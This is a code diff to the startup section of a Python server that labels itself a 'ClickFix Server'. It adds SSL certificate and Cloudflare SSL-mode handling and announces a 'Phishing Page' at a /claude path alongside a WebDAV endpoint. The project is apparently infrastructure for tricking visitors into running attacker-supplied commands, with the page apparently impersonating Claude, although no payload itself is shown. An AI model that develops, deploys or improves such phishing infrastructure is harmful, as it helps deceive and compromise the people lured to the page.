@@ -163,22 +163,30 @@ if __name__ == "__main__":
     
     host = server_cfg.get("host", "0.0.0.0")
     port = server_cfg.get("port", 80)
-    
-    # Check if behind Cloudflare
+    ssl_enabled = server_cfg.get("ssl", False)
+    cert_file = server_cfg.get("cert_file")
+    key_file = server_cfg.get("key_file")
     is_cloudflare = cloudflare_cfg.get("enabled", False)
+    ssl_mode = cloudflare_cfg.get("ssl_mode", "flexible")
     
-    protocol = "https" if is_cloudflare else "http"
+    # Determine protocol
+    if ssl_enabled:
+        protocol = "https"
+    elif is_cloudflare and ssl_mode == "full":
+        protocol = "https"
+    else:
+        protocol = "http"
     
     print("="*70)
     print("ClickFix Server Started!")
-    print(f"-> Mode: {'Cloudflare (HTTPS)' if is_cloudflare else 'Local (HTTP)'}")
+    print(f"-> Mode: {'Cloudflare Full' if (is_cloudflare and ssl_mode == 'full') else 'Cloudflare Flexible' if is_cloudflare else 'Local HTTP'}")
+    print(f"-> SSL: {'Enabled' if ssl_enabled else 'Disabled'}")
     print(f"-> Phishing Page : {protocol}://{host}:{port}/claude")
     print(f"-> WebDAV        : {protocol}://{host}:{port}/dav")
     print("="*70)
     
-    if is_cloudflare:
-        # Cloudflare handles SSL, server runs plain HTTP on 443
-        print("[*] Cloudflare mode - SSL handled by proxy")
-        print("[*] No cert needed on server")
-    
-    uvicorn.run(app, host=host, port=port, reload=False)
+    if ssl_enabled:
+        print(f"[*] SSL enabled - cert: {cert_file}")
+        uvicorn.run(app, host=host, port=port, reload=False, ssl_certfile=cert_file, ssl_keyfile=key_file)
+    else:
+        uvicorn.run(app, host=host, port=port, reload=False)
